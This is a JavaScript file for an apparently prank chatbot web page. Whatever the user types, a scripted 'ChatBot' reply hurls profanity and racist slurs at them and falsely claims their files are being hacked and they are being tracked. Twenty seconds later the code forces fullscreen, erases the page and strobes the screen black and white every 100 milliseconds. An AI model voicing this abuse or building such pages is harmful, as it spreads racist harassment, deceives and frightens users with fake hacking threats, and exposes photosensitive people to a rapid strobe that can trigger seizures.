const form = document.getElementById('chat-form');
const input = document.getElementById('user-input');
const chatBox = document.getElementById('chat-box');
const chatContainer = document.getElementById('chat-container');

form.addEventListener('submit', function (e) {
  e.preventDefault();
  const userMessage = input.value.trim();
  if (!userMessage) return;

  addMessage('You: ' + userMessage, 'user');
  input.value = '';

  setTimeout(() => {
    addMessage("ChatBot: Thanks for trying out our website you piece of shit. Your files are now being hacked you black ass chicken muncher, watermelon enjoyer. You are now currently being tracked because you dumb as fuck. Keep in mind that your a waste of sperm cell", 'bot');
    setTimeout(() => {
      goFullScreen();
      hideChat();
      flashBlackWhite();
    }, 20000); // 20-second delay
  }, 500);
});

function addMessage(text, type) {
  const msg = document.createElement('div');
  msg.textContent = text;
  msg.className = 'message ' + type;
  chatBox.appendChild(msg);
  chatBox.scrollTop = chatBox.scrollHeight;
}

function goFullScreen() {
  const docElm = document.documentElement;
  if (docElm.requestFullscreen) docElm.requestFullscreen();
  else if (docElm.mozRequestFullScreen) docElm.mozRequestFullScreen();
  else if (docElm.webkitRequestFullScreen) docElm.webkitRequestFullScreen();
  else if (docElm.msRequestFullscreen) docElm.msRequestFullscreen();
}

function hideChat() {
  // Hide the chat UI to make screen flash full
  document.body.innerHTML = ''; // wipes everything off
}

function flashBlackWhite() {
  let count = 0;
  const interval = setInterval(() => {
    document.body.style.backgroundColor = count % 2 === 0 ? 'black' : 'white';
    count++;
    if (count > 40) {
      clearInterval(interval);
      document.body.style.backgroundColor = 'black';
    }
  }, 100); // 100ms per flash
}
